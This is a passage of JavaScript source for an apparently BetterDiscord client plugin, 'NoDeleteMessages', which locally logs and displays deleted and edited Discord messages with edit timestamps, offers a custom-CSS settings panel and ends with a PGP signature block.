          dateTime: new Date().toISOString()
        }];
      } else {
        if (this.editedMessages[evt.message.channel_id][evt.message.id].length > 49) {
          this.editedMessages[evt.message.channel_id][evt.message.id].shift() //I think 50 edits is enough no?
        }
        this.editedMessages[evt.message.channel_id][evt.message.id].push({
          message: evt.message.content,
          dateTime: new Date().toISOString()
        });
      }
      if (evt.message.channel_id === this.getCurrentChannelID()) this.updateEditedMessages();
      return true;
    }
    return false;
  }
  observer({
    addedNodes
  }) {
    let len = addedNodes.length;
    let change;
    while (len--) {
      change = addedNodes[len];
      if (change.classList && (change.classList.contains("da-messagesWrapper") || change.classList.contains("da-chat")) || change.firstChild && change.firstChild.classList && change.firstChild.classList.contains("da-message")) {
        this.updateDeletedMessages();
        this.updateEditedMessages();
        break;
      }
    }
  }
  updateDeletedMessages() {
    const channelDeletedMessages = this.deletedMessages[this.getCurrentChannelID()];
    if (!channelDeletedMessages) return;
    $(".da-message").each((index, elem) => {
      try {
        const messageID = ZeresPluginLibrary.ReactTools.getOwnerInstance(elem).props.message.id;
        if (channelDeletedMessages.includes(messageID)) {
          elem.setAttribute(this.deletedMessageAttribute, "");
        }
      } catch (e) {}
    });
  }

  updateEditedMessages() {
    const channelEditedMessages = this.editedMessages[this.getCurrentChannelID()];
    if (!channelEditedMessages) return;
    $(".da-markup").each((index, elem) => {
      try {
        const markupClassName = this.findModule("markup")["markup"].split(" ")[0];
        while (elem.getElementsByClassName(markupClassName).length)
          elem.getElementsByClassName(markupClassName)[0].remove();
        const messageID = ZeresPluginLibrary.ReactTools.getOwnerInstance(elem).props.message.id;
        if (channelEditedMessages[messageID]) {
          elem.setAttribute(this.editedMessageAttribute, "");
          const edited = this.editedMessages[this.getCurrentChannelID()][messageID];
          const editedClassName = this.findModule("edited")["edited"].split(" ")[0];
          for (let i = 0; i < edited.length; i++) {
            const elementEdited = this.showEdited(edited[i].message);

            var timeElement = elementEdited.children[0].children[0];
            var actualDate = new Date();
            var messageEditDate = new Date(edited[i].dateTime);
            var timeEdit = "";
            if (actualDate.toLocaleDateString() == messageEditDate.toLocaleDateString()) {
              timeEdit += "Today at"
            } else {
              timeEdit += messageEditDate.toLocaleDateString();
            }
            timeEdit += " " + messageEditDate.toLocaleTimeString();
            new ZeresPluginLibrary.EmulatedTooltip(timeElement, timeEdit);

            elementEdited.setAttribute(this.editedMessageAttribute, "");
            elem.appendChild(elementEdited);
          }
        }
      } catch (e) {}
    });
  }

  showEdited(content) {
    const editText = document.createElement("div");

    const renderFunc = this.findModule("render");
    const createElementFunc = this.findModule("createElement");
    const parserForFunc = this.findModule(["parserFor", "parse"]);
    const editedClassName = this.findModule("edited")["edited"].split(" ")[0];

    renderFunc.render(
      createElementFunc.createElement("div", {
          className: this.findModule("markup")["markup"].split(" ")[0],
          [this.editedMessageAttribute]: true
        },
        parserForFunc.parse(content),
        //TODO: Find a way to implement display time of edit
        createElementFunc.createElement("time", {
            className: editedClassName + " da-edited",
            role: "note"
          },
          parserForFunc.parse("(edited)")
        )
      ),
      editText
    );

    return editText;
  }

  findModule(properties) {
    if (typeof properties === "string") { //search for an unique property
      return ZeresPluginLibrary.WebpackModules.find(module => module[properties] != undefined);
    } else { //search multiple properties
      return ZeresPluginLibrary.WebpackModules.find(module => properties.every(property => module[property] != undefined));
    }
  }

  getCurrentChannelID() {
    return ZeresPluginLibrary.DiscordModules.SelectedChannelStore.getChannelId();
  }

  updateCustomCSS(css) {
    this.settings.customCSS = css;
    BdApi.clearCSS(this.customCSSID);
    BdApi.injectCSS(this.customCSSID, this.settings.customCSS.replace(/<DELETED_MESSAGE>/g, `[${this.deletedMessageAttribute}]`));
  }

  updateSettings() {
    BdApi.saveData("NoDeleteMessages", "settings", this.settings);
  }

  getSettingsPanel() {
    if (!this.initialized) return;
    this.settings = BdApi.loadData("NoDeleteMessages", "settings") || {
      customCSS: ""
    };
    const panel = $("<form>").addClass("form").css("width", "100%");
    if (this.initialized) this.generateSettings(panel);
    return panel[0];
  }

  generateSettings(panel) {
    new window.ZeresPluginLibrary.Settings.SettingGroup("Configuration", {
      collapsible: false,
      shown: true,
      callback: () => {
        this.updateSettings();
      }
    }).appendTo(panel).append(
      new window.ZeresPluginLibrary.Settings.Textbox("Custom CSS (DEPRECATED, DO NOT USE)", "Custom CSS that is compatible with this plugin. (DEPRECATED, DO NOT USE)", (this.settings && this.settings.customCSS) || "", val => {
        this.updateCustomCSS(val);
      })
    );
  }
}

/*
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEGTGecftnrhRz9oomf4qgY6FcSQsFAl00/uQACgkQf4qgY6Fc
SQuy2QgA1r2ahVv3LKnJS76bmmb0u9YTmR75WC+fhtXp3y2UhQTJkXEcvzeD6x0S
gytO6XashG0JdZtjuXxt5RXdhYSkRIS6xZJ8tL1WsNPNMRxJDseNOKxk3Pp4PaT0
CjycB5JQP1rn9mYwNbVPEh0/Xj6nqCdKOc6/H4+My5nd2nvAssgcnzSZ0JU3f7eK
SYXXk41n4Aq14iRw38I1eY6/5z97nywjiVg3Q01coUMVUvw3vA2GN9cQk1IyzEQs
SbaWKK5idOE1E1XIS9G9LN5kXgwJ8U4TmBHOarEHEU5bfMurjiXZvyQB3Le19+dI
bBSdWTkVJXDKWdoQdf+rF4iQHt1QQQ==
=AA1V
-----END PGP SIGNATURE-----
*/
